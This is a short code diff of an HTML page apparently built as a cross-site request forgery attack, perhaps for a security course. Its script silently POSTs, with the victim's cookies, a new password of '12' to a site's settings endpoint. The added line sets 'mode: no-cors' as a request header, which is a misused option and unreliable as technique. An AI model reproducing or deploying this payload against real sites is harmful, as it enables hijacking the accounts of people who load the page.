@@ -9,6 +9,7 @@
     const xhr = new XMLHttpRequest();
     xhr.open('POST', 'https://cats.is-course.ru/settings', true);
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.setRequestHeader('mode', 'no-cors');
     xhr.withCredentials = true;
     xhr.send('password=12&confirm-password=12');
   </script>
